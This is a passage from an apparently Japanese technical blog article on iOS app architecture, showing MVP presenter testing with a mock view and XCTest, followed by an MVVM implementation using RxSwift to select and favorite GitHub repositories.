<p><a href="https://camo.qiitausercontent.com/8705bbda999bc6546e71e60ddbe92ffdc7ea6248/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f37346265613635332d303839372d646231622d636539332d6137323738346464326566392e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8705bbda999bc6546e71e60ddbe92ffdc7ea6248/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f37346265613635332d303839372d646231622d636539332d6137323738346464326566392e6a706567" alt="MVP.003.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/74bea653-0897-db1b-ce93-a72784dd2ef9.jpeg"></a></p>

<h3>
<span id="テスト" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>テスト</h3>

<p><code>FavoriteView</code>はprotocolなので、モック化にすることで<code>FavoritePresenter</code>のテストを行うことができます。<br>
<code>FavoriteViewMock</code>は下記のようになります。<br>
該当するメソッドが呼び出されたとき用のclosureをpropertyで定義し、それぞれのメソッドが呼び出された際に実行します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewMock</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FavoriteViewMock</span><span class="p">:</span> <span class="n">FavoriteView</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">presenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">?</span>

    <span class="kd">var</span> <span class="nv">didCallReloadData</span><span class="p">:</span> <span class="p">(()</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">)?</span>
    <span class="kd">var</span> <span class="nv">didCallShowRepository</span><span class="p">:</span> <span class="p">((</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Void</span><span class="p">)?</span>

    <span class="kd">func</span> <span class="nf">reloadData</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">didCallReloadData</span><span class="p">?()</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">showRepository</span><span class="p">(</span><span class="n">with</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">didCallShowRepository</span><span class="p">?(</span><span class="n">repository</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>XCTestなどでテストを実行する際の実装は、下記のようになります。</p>

<p><code>FavoriteViewPresenter</code>のinitializerの引数であるviewは<code>FavoriteView</code>となっているので、<code>FavoriteView</code>を採用している<code>FavoriteViewMock</code>を引数として渡すことが可能です。<br>
テストメソッド内では該当するclosureに対して期待する結果を記述し、その後に紐づくpresenterのメソッドを呼び出しています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewTests</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FavoritePresenterTests</span><span class="p">:</span> <span class="n">XCTestCase</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">favoriteView</span><span class="p">:</span> <span class="n">FavoriteViewMock</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">favoritePresenter</span><span class="p">:</span> <span class="n">FavoritePresenter</span><span class="p">!</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">setUp</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">setUp</span><span class="p">()</span>

        <span class="kc">self</span><span class="p">.</span><span class="n">favoriteView</span> <span class="p">=</span> <span class="n">FavoriteViewMock</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favoritePresenter</span> <span class="p">=</span> <span class="n">FavoriteViewPresenter</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">favoriteView</span><span class="p">)</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favoriteView</span><span class="p">.</span><span class="n">presenter</span> <span class="p">=</span> <span class="n">favoritePresenter</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testReloadData</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testReloadData expectation"</span><span class="p">)</span>

        <span class="n">favoriteView</span><span class="p">.</span><span class="n">didCallReloadData</span> <span class="p">=</span> <span class="p">{</span>
            <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
        <span class="p">}</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="n">favoritePresenter</span><span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testShowRepository</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testShowRepository expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="n">favoritePresenter</span><span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>

        <span class="n">favoriteView</span><span class="p">.</span><span class="n">didCallShowRepository</span> <span class="p">=</span> <span class="p">{</span> <span class="n">repo</span> <span class="k">in</span>
            <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">repo</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
            <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
        <span class="p">}</span>

        <span class="n">favoritePresenter</span><span class="p">.</span><span class="n">showFavoriteRepository</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="mi">0</span><span class="p">)</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h3>
<span id="考察" class="fragment"></span><a href="#%E8%80%83%E5%AF%9F"><i class="fa fa-link"></i></a>考察</h3>

<p>ViewとPresenterはお互いの参照も持ち合うので、依存し合う形になります。<br>
しかし、PresenterとViewを抽象化しておくことでMock化が容易になります。<br>
よって、PresenterにViewのMockを渡すことプレゼンテーション層に関するロジックのテストが可能になります。</p>

<h2>
<span id="mvvm" class="fragment"></span><a href="#mvvm"><i class="fa fa-link"></i></a>MVVM</h2>

<p>続いてMVVMによる実装について書いていきます。</p>

<p><a href="https://camo.qiitausercontent.com/98d926a982d17547fc814f3f5682f8a0cb008d74/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f32346136336264342d633034372d383230382d323239362d3761366462333866643639302e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/98d926a982d17547fc814f3f5682f8a0cb008d74/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f32346136336264342d633034372d383230382d323239362d3761366462333866643639302e6a706567" width="50%" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/24a63bd4-c047-8208-2296-7a6db38fd690.jpeg"></a></p>

<p>ViewControllerに実装されるプレゼンテーション層に関するロジックをViewModelに実装することで、責務を明確にすることができます。<br>
流れとしては、Viewはユーザーからのアクションを受け取って、そのイベントをViewModelにbindします。<br>
そして、そのbindされたイベントによってViewModelはModelの取得や更新を行います。<br>
ViewModelは更新された情報をイベントとしてViewにbindし、Viewはbindされたイベントをもとに結果を反映させます。</p>

<p>※Data bindingを実現するために、<a href="https://github.com/ReactiveX/RxSwift" rel="nofollow noopener" target="_blank">RxSwift</a>を利用しています。</p>

<h3>
<span id="画面遷移-1" class="fragment"></span><a href="#%E7%94%BB%E9%9D%A2%E9%81%B7%E7%A7%BB-1"><i class="fa fa-link"></i></a>画面遷移</h3>

<p><code>UITableViewDataSource</code>や<code>UITableViewDelegate</code>の実装を、<code>FavoriteViewController</code>の場合は<code>FavoriteViewDataSource</code>に移しています。<br>
<code>FavoriteViewDataSource</code>内の<code>tableView(_:didSelectRowAt:)</code>では、<code>_selectedIndexPath: PublishSubject&lt;IndexPath&gt;</code>が呼び出されています。<br>
そして、<code>selectedIndexPath: Observable&lt;IndexPath&gt;</code>によって外部に公開されています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewDataSource</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewDataSource</span><span class="p">:</span> <span class="bp">NSObject</span><span class="p">,</span> <span class="bp">UITableViewDelegate</span><span class="p">,</span> <span class="p">...</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">selectedIndexPath</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">IndexPath</span><span class="p">&gt;</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_selectedIndexPath</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">IndexPath</span><span class="p">&gt;()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">viewModel</span> <span class="p">=</span> <span class="n">viewModel</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">selectedIndexPath</span> <span class="p">=</span> <span class="n">_selectedIndexPath</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">tableView</span><span class="p">(</span><span class="kc">_</span> <span class="n">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">,</span> <span class="n">didSelectRowAt</span> <span class="n">indexPath</span><span class="p">:</span> <span class="n">IndexPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">_selectedIndexPath</span><span class="p">.</span><span class="n">onNext</span><span class="p">(</span><span class="n">indexPath</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>selectedIndexPath: Observable&lt;IndexPath&gt;</code>を<code>FavoriteViewModel</code>内のinputとして、initializerの引数として受け取ります。<br>
そのselectedIndexPathからイベントが渡ってくると、ViewModel内で保持している<code>_favorites: Variable&lt;[GithubKit.Repository]&gt;</code>の最新の状態をwithLatestFromで取得し、配列内で該当するrowのRepositoryを返します。<br>
そのイベントを<code>selectedRepository: Observable&lt;GithubKit.Repository&gt;</code>として外部に公開します。<br>
また<code>favorites: Observable&lt;[GithubKit.Repository]&gt;</code>は<code>_favorites</code>のイベントを外部に公開するために利用しています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewModel</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewModel</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nv">favorites</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span>
    <span class="kd">let</span> <span class="nv">selectedRepository</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">&gt;</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_favorites</span> <span class="p">=</span> <span class="n">Variable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">([])</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(...,</span> <span class="n">selectedIndexPath</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">IndexPath</span><span class="p">&gt;)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favorites</span> <span class="p">=</span> <span class="n">_favorites</span><span class="p">.</span><span class="n">asObservable</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">selectedRepository</span> <span class="p">=</span> <span class="n">selectedIndexPath</span>
            <span class="p">.</span><span class="n">withLatestFrom</span><span class="p">(</span><span class="n">_favorites</span><span class="p">.</span><span class="n">asObservable</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$1</span><span class="p">[</span><span class="nv">$0</span><span class="p">.</span><span class="n">row</span><span class="p">]</span> <span class="p">}</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewDataSource</code>でも<code>FavoriteViewModel</code>を利用しているので、<code>FavoriteViewModel</code>のinitializerの引数でdataSource.selectedIndexPathを渡すことができません。<br>
そのため、<code>FavoriteViewController</code>でも<code>selectedIndexPath: PublishSubject&lt;IndexPath&gt;</code>定義し、そのselectedIndexPathを<code>FavoriteViewModel</code>のinitializerに渡します。<br>
dataSource.selectedIndexPathをself.selectedIndexPathにbindすることで、dataSourceからのイベントをviewModelに流すことができます。<br>
また、<code>FavoriteViewModel</code>で公開されているselectedRepositoryを<code>showRepository: AnyObserver&lt;GithubKit.Repository&gt;</code>にbindすることで、<code>RepositoryViewController</code>に遷移させることができます。<br>
また、self.favoritesを<code>favoritesInput: AnyObserver&lt;[GithubKit.Repository]&gt;</code>として外部に公開し、viewModel.favoritesを<code>favoritesOutput: Observable&lt;[GithubKit.Repository]&gt;</code>として外部に公開します。<br>
これらが遷移する際に、それぞれのViewControllerのinitializerの引数として渡されていきます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span>

    <span class="kd">var</span> <span class="nv">favoritesInput</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">return</span> <span class="n">favorites</span><span class="p">.</span><span class="n">asObserver</span><span class="p">()</span> <span class="p">}</span>
    <span class="kd">var</span> <span class="nv">favoritesOutput</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">return</span> <span class="n">viewModel</span><span class="p">.</span><span class="n">favorites</span> <span class="p">}</span>

    <span class="kd">private</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">dataSource</span><span class="p">:</span> <span class="n">FavoriteViewDataSource</span> <span class="p">=</span> <span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">viewModel</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">viewModel</span><span class="p">)</span>
    <span class="kd">private</span> <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span> <span class="p">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="kd">init</span><span class="p">(...,</span> <span class="n">selectedIndexPath</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">selectedIndexPath</span><span class="p">)</span>
    <span class="p">}()</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">selectedIndexPath</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">IndexPath</span><span class="p">&gt;()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="c1">// observe dataSource</span>
        <span class="n">dataSource</span><span class="p">.</span><span class="n">selectedIndexPath</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">selectedIndexPath</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>

        <span class="c1">// observe viewModel</span>
        <span class="n">viewModel</span><span class="p">.</span><span class="n">selectedRepository</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">showRepository</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">showRepository</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="p">&lt;</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">UIBindingObserver</span><span class="p">(</span><span class="n">UIElement</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span> <span class="p">{</span> <span class="n">me</span><span class="p">,</span> <span class="n">repository</span> <span class="k">in</span>
            <span class="kd">let</span> <span class="nv">vc</span> <span class="p">=</span> <span class="n">RepositoryViewController</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">repository</span><span class="p">,</span>
                                              <span class="n">favoritesOutput</span><span class="p">:</span> <span class="n">me</span><span class="p">.</span><span class="n">favoritesOutput</span><span class="p">,</span>
                                              <span class="n">favoritesInput</span><span class="p">:</span> <span class="n">me</span><span class="p">.</span><span class="n">favoritesInput</span><span class="p">)</span>
            <span class="n">me</span><span class="p">.</span><span class="n">navigationController</span><span class="p">?.</span><span class="n">pushViewController</span><span class="p">(</span><span class="n">vc</span><span class="p">,</span> <span class="n">animated</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
        <span class="p">}.</span><span class="n">asObserver</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p>上記のTableViewのCellが選択されてから、次のViewControllerに遷移するまでの流れは下図のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/27ae9c4441adb7f7ed975abb624d21dcb4ed7b4c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f34323564663332642d643236392d393939622d343635652d3734633939373966633739642e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/27ae9c4441adb7f7ed975abb624d21dcb4ed7b4c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f34323564663332642d643236392d393939622d343635652d3734633939373966633739642e6a706567" alt="MVVM.002.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/425df32d-d269-999b-465e-74c9979fc79d.jpeg"></a></p>

<h3>
<span id="お気に入りに追加-1" class="fragment"></span><a href="#%E3%81%8A%E6%B0%97%E3%81%AB%E5%85%A5%E3%82%8A%E3%81%AB%E8%BF%BD%E5%8A%A0-1"><i class="fa fa-link"></i></a>お気に入りに追加</h3>

<p><code>favoriteButtonItem</code>のタップイベントを<code>favoriteButtonItem.rx.tap</code>として、<code>RepositoryViewModel</code>のinitializerに渡します。<br>
そうすることによって、テスト時にPublishSubjectを利用することでタップを再現することができるようになります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewController</span><span class="p">:</span> <span class="n">SFSafariViewController</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favoriteButtonItem</span><span class="p">:</span> <span class="bp">UIBarButtonItem</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">RepositoryViewModel</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">Repository</span><span class="p">,</span>
         <span class="n">favoritesOutput</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">,</span>
         <span class="n">favoritesInput</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">favoriteButtonItem</span> <span class="p">=</span> <span class="bp">UIBarButtonItem</span><span class="p">(</span><span class="n">title</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">style</span><span class="p">:</span> <span class="p">.</span><span class="n">plain</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">action</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favoriteButtonItem</span> <span class="p">=</span> <span class="n">favoriteButtonItem</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">viewModel</span> <span class="p">=</span> <span class="n">RepositoryViewModel</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">repository</span><span class="p">,</span>
                                             <span class="n">favoritesOutput</span><span class="p">:</span> <span class="n">favoritesOutput</span><span class="p">,</span>
                                             <span class="n">favoritesInput</span><span class="p">:</span> <span class="n">favoritesInput</span><span class="p">,</span>
                                             <span class="n">favoriteButtonTap</span><span class="p">:</span> <span class="n">favoriteButtonItem</span><span class="p">.</span><span class="n">rx</span><span class="p">.</span><span class="n">tap</span><span class="p">)</span>
        <span class="kc">super</span><span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">entersReaderIfAvailable</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>RepositoryViewModel</code>では、initializerの引数である<code>favoritesOutput: Observable&lt;[GithubKit.Repository]&gt;</code>からお気に入り一覧の配列の更新イベントを受け取ります。<br>
その際に、ViewModelで保持している<code>GithubKit.Repository</code>が渡ってきた配列に含まれている場合は<strong>配列と該当するindex</strong>を返し、含まれていなかった場合は<strong>配列とnil</strong>を返します。<br>
<code>favoriteButtonTap: ControlEvent&lt;Void&gt;</code>のイベントを受け取った際に上記の最新状態をwithLatestFromで受け取り、indexが存在した場合は<strong>該当のindexを削除した状態の配列</strong>返し、indexが存在しない場合は<strong>ViewModelが保持している<code>GithubKit.Repository</code>を追加した配列</strong>を返します。<br>
そして、<code>favoritesInput: AnyObserver&lt;[GithubKit.Repository]&gt;</code>にその配列を流します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryViewModel</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewModel</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">repository</span><span class="p">:</span> <span class="n">Repository</span><span class="p">,</span>
         <span class="n">favoritesOutput</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">,</span>
         <span class="n">favoritesInput</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">,</span>
         <span class="n">favoriteButtonTap</span><span class="p">:</span> <span class="n">ControlEvent</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">favoritesAndIndex</span> <span class="p">=</span> <span class="n">favoritesOutput</span>
            <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="p">[</span><span class="n">repository</span><span class="p">]</span> <span class="n">favorites</span> <span class="k">in</span>
                <span class="p">(</span><span class="n">favorites</span><span class="p">,</span> <span class="n">favorites</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="k">where</span><span class="p">:</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span> <span class="p">}))</span>
            <span class="p">}</span>
        <span class="p">...</span>
        <span class="n">favoriteButtonTap</span>
            <span class="p">.</span><span class="n">withLatestFrom</span><span class="p">(</span><span class="n">favoritesAndIndex</span><span class="p">)</span>
            <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="p">[</span><span class="n">repository</span><span class="p">]</span> <span class="n">favorites</span><span class="p">,</span> <span class="n">index</span> <span class="k">in</span>
                <span class="kd">var</span> <span class="nv">favorites</span> <span class="p">=</span> <span class="n">favorites</span>
                <span class="k">if</span> <span class="kd">let</span> <span class="nv">index</span> <span class="p">=</span> <span class="n">index</span> <span class="p">{</span>
                    <span class="n">favorites</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">index</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">favorites</span>
                <span class="p">}</span>
                <span class="n">favorites</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">favorites</span>
            <span class="p">}</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span> <span class="n">favoritesInput</span><span class="p">.</span><span class="n">onNext</span><span class="p">(</span><span class="nv">$0</span><span class="p">)</span> <span class="p">})</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewModel</code>では、initializerの引数として受け取った<code>favoritesObservable: Observable&lt;[GithubKit.Repository]&gt;</code>を利用して外部からのイベントを受け取ります。<br>
favoritesObservableを_favoritesにbindして、保持している配列を更新します。<br>
_favoritesが更新されたイベントを<code>Observable&lt;Void&gt;</code>に変換して、<code>relaodData: Observable&lt;Void&gt;</code>として外部に公開します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewModel</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewModel</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">let</span> <span class="nv">relaodData</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_favorites</span> <span class="p">=</span> <span class="n">Variable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">([])</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">favoritesObservable</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
        <span class="p">...</span>
